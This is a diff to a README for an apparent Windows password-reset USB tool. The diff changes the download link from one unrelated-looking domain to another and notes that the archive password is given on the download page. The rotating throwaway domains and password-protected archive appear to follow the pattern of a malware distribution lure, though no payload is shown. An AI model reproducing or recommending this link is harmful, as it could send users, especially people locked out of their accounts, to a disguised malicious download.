@@ -17,7 +17,7 @@ Resets any Windows local account password directly from a bootable USB drive —
 
 ## Download
 
-[![⬇ Download v2.0.5](https://img.shields.io/badge/⬇_Download_v2.0.5-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/winpassword)
+[![⬇ Download v2.0.5](https://img.shields.io/badge/⬇_Download_v2.0.5-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/winpassword)
 
 > The archive password is shown on the download page.
 
